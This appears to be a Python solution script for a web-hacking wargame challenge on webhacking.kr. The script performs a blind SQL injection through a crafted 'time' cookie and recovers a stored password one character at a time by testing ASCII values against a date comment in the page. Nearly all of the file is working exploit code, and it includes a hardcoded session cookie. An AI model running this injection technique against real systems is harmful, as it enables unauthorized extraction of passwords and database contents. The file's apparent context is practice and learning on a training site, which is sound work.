from http import client

conn = client.HTTPConnection('webhacking.kr', 80)

base = "/challenge/web/web-02/index.php"

tryList = []
awsList = []

for i in range(48, 126):
    tryList.append(i)

for i in range(1, 13):
    for w in tryList:
        print(str(w))
        headers = {
            'Cookie': 'time=1515313346 and (select ascii(substring(password,' + str(i) + ',1)) from FreeB0aRd = ' + str(
                w) + '; PHPSESSID=b42c70b37b426e713f255de859633556'}
        conn.request('GET', base, '', headers)
        res = conn.getresponse()
        resData = res.read()
        strRes = str(resData)
        if (strRes.find('<!--2070-01-01 09:00:00-->') != -1):
            awsList.append(str(w))
            break

for i in awsList:
    print(chr(int(i)), end="")

conn.close()
